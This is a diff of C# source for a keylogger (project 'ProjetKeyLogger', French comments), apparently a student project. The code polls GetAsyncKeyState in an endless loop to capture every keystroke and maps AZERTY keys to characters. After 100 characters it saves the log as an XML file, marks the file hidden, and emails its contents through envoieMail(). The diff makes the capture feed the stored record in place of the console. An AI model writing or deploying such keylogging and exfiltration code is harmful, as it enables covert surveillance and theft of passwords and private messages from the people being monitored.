@@ -9,7 +9,7 @@ namespace ProjetKeyLogger
 {
     class KeyLogger
     {
-        //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
+        //Texte saisie depuis le dernier clic ou touche "entré" ou temps > 30 secondes
         private CollectionEnregistrement collection_enregistrement;
 
         private string file_path;
@@ -25,7 +25,7 @@ namespace ProjetKeyLogger
             }
         }
 
-        //Constructeur(peut etre pas nécessaire)
+        //Constructeur
         public KeyLogger()
         {
             //initialisation du nombre de caractere
@@ -40,25 +40,20 @@ namespace ProjetKeyLogger
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
-        //Cette fonction vient d'une librairie stockée dans user32.dll (le keylogger ne marche donc que sur windows, pas mac)
+        //Cette fonction vient d'une librairie stockée dans user32.dll 
         // l'argument est une "virtual key code " car chaque action est asscoiée à une clé
-
-
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
 
-        //La fonction capture ne marche pas avec des claviers tactiles sur l'écran
         public void capture()
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
             Enregistrement enregistrement = new Enregistrement();
-            //capture les frappes de touches et les afficher dans la console
+           
             bool majuscule = false;
             bool shift = false;
             bool ctrl = false;
             bool altgr = false;
-
-
 
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
@@ -67,21 +62,15 @@ namespace ProjetKeyLogger
                 Thread.Sleep(3); //nombre en miliseconde
 
                 //verification de l'état de chaque touche (up ou down)
-                                
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
                    
                     int statut_cle = GetAsyncKeyState(codeASCII);
-                    //le statut d'un clé est a 0 si elle n'est pas active
-                    //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
-                    // on caste le nombre ascii en char
+                    //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
-
-                        string valeurs;
                         switch (codeASCII)
                         {
-
                             //Si touche Entrée
                             case 13:
                                 //On ajoute l'enregistrement a la collection
@@ -90,7 +79,7 @@ namespace ProjetKeyLogger
                                 //On réinitialise l'enregistrement
                                 enregistrement = new Enregistrement();
 
-                                //SI le nombre de caractere tapé a dépassé la limite
+                                //SI le nombre de caracteres tapés a dépassé la limite
                                 if (nb_caractere_tape > 100)
                                 {
                                     //On enregistre le contenue en xml
@@ -99,7 +88,7 @@ namespace ProjetKeyLogger
                                     //on cache le xml
                                     File.SetAttributes(file_path, FileAttributes.Hidden);
                                     //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
-                                    
+
                                     //On reinitialise le nombre de caracteres
                                     nb_caractere_tape = 0;
 
@@ -109,14 +98,15 @@ namespace ProjetKeyLogger
                                     //envoie du mail
                                     envoieMail();
                                 }
-                                
+
                                 break;
 
+                            //touche shift
                             case 16:
-                                 shift = true;
+                                shift = true;
                                 break;
 
-                            //si touche majuscule
+                            //touche majuscule
                             case 20:
                                 if (majuscule == false)
                                 {
@@ -126,17 +116,20 @@ namespace ProjetKeyLogger
                                 {
                                     majuscule = false;
                                 }
-                               break;
-                           
+                                break;
+
+                            //touche effacer
                             case 8:
                                 enregistrement.effacerContenu();
                                 break;
 
+                            //touche espace
                             case 9:
-                                Console.Write(" ");
+                                enregistrement.ajouterContenu(Char.Parse(" "));
                                 break;
 
-                            case 46: //touche suppr : effacer contenu mais dans l'autre sens
+                            //touche suppr 
+                            case 46:
                                 break;
 
                             case 48:
@@ -157,26 +150,26 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == false & altgr == false & shift == false)
                                     {
-                                        valeurs = "à&é\"'(-è_ç";
-                                        Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                        char[] valeurs = { 'à', '&', 'é', '\"', '\'', '(', '-', 'è', '_', 'ç' };
+                                        enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
                                     }
                                     else
                                     {
                                         if (altgr == true)
                                         {
-                                            valeurs = "@ ~#{[|`\\^";
-                                            Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                            char[] valeurs = { '@', ' ', '~', '#', '{', '[', '|', '`', '\\', '^', '"' };
+                                            enregistrement.ajouterContenu(valeurs[codeASCII - 48]);
                                             altgr = false;
                                         }
                                         else
                                         {
-                                            Console.Write((char)codeASCII);
+                                            enregistrement.ajouterContenu((char)codeASCII);
                                         }
                                     }
                                 }
                                 break;
 
-                            //cas du pavé numérique
+                            //pavé numérique
                             case 96:
                             case 97:
                             case 98:
@@ -193,7 +186,8 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    Console.Write((int)codeASCII - 96);
+                                    char[] valeurs = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
+                                    enregistrement.ajouterContenu(valeurs[codeASCII - 96]);
                                 }
                                 break;
 
@@ -209,8 +203,8 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    valeurs = "*+ -./";
-                                    Console.Write(valeurs.Substring(codeASCII - 106, 1));
+                                    char[] valeurs = { '*', '+',' ', '-', '.', '/' };
+                                    enregistrement.ajouterContenu(valeurs[codeASCII - 106]);
                                 }
                                 break;
 
@@ -229,9 +223,8 @@ namespace ProjetKeyLogger
                             case 163:
                                 ctrl = true;
                                 break;
+
                             //alt
-                            //le alt sert à inserer des caracteres spéciaux avec le pavé numerique mais trop relou il doit en avoir des centaines on peut pas tous les faire??
-                            // genre alt+3 ca fait ♥ et ca jusqu'à +200..
                             case 164:
                                 break;
 
@@ -252,29 +245,27 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    valeurs = "$=, ;:ù£+? ./%¤}";
+                                    char[] valeurs = {'$','=',',',' ',';',':','ù','£','+','?','.','/','%','¤','}' };
                                     if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        Console.Write(valeurs.Substring(codeASCII - 179, 1));
+                                        enregistrement.ajouterContenu(valeurs[codeASCII - 179]);
                                         shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & (codeASCII == 186 | codeASCII == 187))
                                         {
-                                            Console.Write(valeurs.Substring(codeASCII - 172, 1));
+                                            enregistrement.ajouterContenu(valeurs[codeASCII - 172]);
                                             altgr = false;
                                         }
                                         else
                                         {
-                                            Console.Write(valeurs.Substring(codeASCII - 186, 1));
+                                            enregistrement.ajouterContenu(valeurs[codeASCII - 186]);
                                         }
                                     }
                                 }
                                 break;
 
-                            //faire une correction pour que ca fasse directement la lettre ê par exemple avec la touche ^ ?
-                            //ou blk car si on reproduit ces touches ca donnera le même resultat 
                             case 219:
                             case 220:
                             case 221:
@@ -286,26 +277,27 @@ namespace ProjetKeyLogger
                                 }
                                 else
                                 {
-                                    valeurs = ")*^²!°µ¨²§";
+                                    char[] valeurs = { ')', '*', '^', '²', '!', '°', 'µ', '¨', '²', '§' };
                                     if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        Console.Write(valeurs.Substring(codeASCII - 214, 1));
+                                        enregistrement.ajouterContenu(valeurs[codeASCII - 214]);
                                         shift = false;
                                     }
                                     else
                                     {
                                         if (altgr == true & codeASCII == 219)
                                         {
-                                            Console.Write("]");
+                                            enregistrement.ajouterContenu(char.Parse("]"));
                                         }
                                         else
                                         {
-                                            Console.Write(valeurs.Substring(codeASCII - 219, 1));
+                                            enregistrement.ajouterContenu(valeurs[codeASCII - 219]);
                                         }
                                     }
                                 }
                                 break;
 
+                            //touches < et >
                             case 226:
                                 if (ctrl == true)
                                 {
@@ -315,18 +307,17 @@ namespace ProjetKeyLogger
                                 {
                                     if (shift == false)
                                     {
-                                        Console.Write("<");
+                                        enregistrement.ajouterContenu(char.Parse("<"));
                                     }
                                     else
                                     {
-                                        Console.Write(">");
+                                        enregistrement.ajouterContenu(char.Parse(">"));
                                         shift = false;
                                     }
                                 }
                                 break;
 
-                            //les fleches mais jsp pq les nombres sont associés à 255 aussi
-                            //je pense trop compliqué de se déplacer dans le texte avec donc vaut mieux rien faire
+                            //les fleches 
                             case 37:
                             case 38:
                             case 39:
@@ -343,12 +334,12 @@ namespace ProjetKeyLogger
                                 {
                                     if (majuscule == true | shift == true)
                                     {
-                                        Console.Write(Char.ToUpper((char)codeASCII));
+                                        enregistrement.ajouterContenu(Char.ToUpper((char)codeASCII));
                                         shift = false;
                                     }
                                     else
                                     {
-                                        Console.Write(Char.ToLower((char)codeASCII));
+                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII));
                                     }
                                 }
                                 
@@ -368,9 +359,10 @@ namespace ProjetKeyLogger
         }
 
 
-        //Envoyer du fichier par mail
+        //Envoie du fichier par mail
         private void envoieMail()
         {
+
             //recuperation du contenu du fichier
             string contenu_fichier = File.ReadAllText(file_path);
 
@@ -428,7 +420,5 @@ namespace ProjetKeyLogger
             // Libère les ressources utilisé par le fichier envoyé par mail. Cela supprime le flux et permet au programme de continuer, sans cela le programme plante.
             message_mail.Dispose();
         }
-
-
     }
 }
